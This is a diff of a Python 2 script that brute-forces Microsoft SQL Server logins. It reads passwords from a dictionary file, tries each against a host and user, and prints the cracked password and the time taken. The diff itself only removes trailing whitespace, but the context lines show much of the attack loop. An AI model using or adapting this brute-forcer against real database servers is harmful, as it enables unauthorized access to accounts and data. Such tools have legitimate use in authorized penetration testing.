@@ -44,7 +44,7 @@ type = "brute"
 
 def bruteForce(host, port, user, passwd):
     packet = makeSqlServerPacket(username = user, password = passwd, dbname = "master")
-    
+
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((host, int(port)))
@@ -69,10 +69,10 @@ class CBrute:
 
     def __init__(self):
         pass
-    
+
     def run(self):
         startTime = time.time()
-        
+
         if self.dict.has_key("dict"):
             f = file(self.dict["dict"], "r")
 
@@ -84,39 +84,39 @@ class CBrute:
         while 1:
             i += 1
             line = f.readline()
-            
+
             if not line:
                 break
-    
+
             line = line.strip("\r").strip("\n")
-            
+
             sys.stdout.write("\b"*100 + "Brute forcing #" + str(i) + " with password '" + str(line) + "'" + " "*20)
             sys.stdout.flush()
-    
+
             res= bruteForce(mHost, mPort, mUser, line)
-    
+
             if res is None:
                 return
-    
+
             if res:
                 sys.stdout.write("\b"*100 + "\r")
                 sys.stdout.write(" "*100)
                 sys.stdout.write("\b"*100 + "\r")
                 sys.stdout.flush()
-    
+
                 print "Password for user '" + mUser + "' is '" + str(line) + "'"
                 f.close()
-                
+
                 endTime = time.time() - startTime
                 print "Brute forced in",endTime,"second(s)."
                 return
-    
+
         sys.stdout.write("\b"*100 + "\r")
         sys.stdout.write(" "*100)
         sys.stdout.write("\b"*100 + "\r")
         sys.stdout.flush()
         sys.stdout.write("No password cracked. No luck :(\r\n")
-    
+
         f.close()
 
 def usage():
@@ -135,7 +135,7 @@ def main():
 
     if len(sys.argv) > 1:
         for arg in sys.argv:
-        
+
             if arg == sys.argv[0]:
                 continue
 
@@ -158,12 +158,12 @@ def main():
     while 1:
         i += 1
         line = f.readline()
-        
+
         if not line:
             break
 
         line = line.strip("\r").strip("\n")
-        
+
         sys.stdout.write("\b"*100 + "Brute forcing #" + str(i) + " with password '" + str(line) + "'" + " "*20)
         sys.stdout.flush()
 
@@ -180,7 +180,7 @@ def main():
 
             print "Password for user '" + mUser + "' is '" + str(line) + "'"
             f.close()
-            
+
             endTime = time.time() - startTime
             print "Brute forced in",endTime,"second(s)."
             return
